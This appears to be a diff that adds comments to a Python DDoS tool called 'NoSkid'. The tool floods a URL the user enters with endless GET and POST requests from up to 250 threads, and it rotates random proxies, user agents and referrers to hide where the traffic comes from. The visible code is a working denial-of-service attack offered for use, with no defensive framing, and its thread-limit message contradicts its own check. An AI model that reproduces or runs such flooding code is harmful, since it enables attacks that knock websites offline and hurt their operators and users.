@@ -18,8 +18,10 @@ class NoSkid:
     def flood_url(self):
         while True:
             try:
+                # choose a random proxy
                 proxy = random.choice(PROXIES)
                 
+                # send get request and close
                 r = requests.get(
                     url     = self.URL, 
                     headers = {'User-Agent': random.choice(USER_AGENTS), 'Referrer': random.choice(REFERRERS)},
@@ -28,6 +30,7 @@ class NoSkid:
                 print(f'{C.lime}• {C.white}Request sent, proxy: {C.violet}{proxy}')
                 
                 for _ in range(10):
+                    # send post request and close
                     r = requests.post(
                         url     = self.URL, 
                         headers = {'User-Agent': random.choice(USER_AGENTS), 'Referrer': random.choice(REFERRERS)},
@@ -38,7 +41,11 @@ class NoSkid:
                 pass
 
 def main():
+    
+    # print out the banner
     print(C.banner)
+    
+    # print out the proxy count
     print(f'{C.white}Proxies: {C.lime}{len(PROXIES)}{C.white}\n')
     
     url  = input(f'{C.white}URL:{C.cyan} ')
@@ -46,15 +53,17 @@ def main():
     while True:
         threads = int(input(f'{C.white}Threads (1-250):{C.cyan} '))
         
+        # no more than 250 threads
         if not threads > 251:
             break
             
+        # if a thread count was not found    
         if not threads:
             threads = 250 ; break
             
         print(f'{C.red}Thread limit is 100.{C.white}\n')
         
-    print(f'{C.white}Using {C.lime}{threads} {C.white}threads.')    
+    print(f'{C.white}Using {C.lime}{threads} {C.white}threads.')
     session = NoSkid(url)
     print(f'{C.white}Flooding {C.cyan}{url}{C.white}...\n')
     
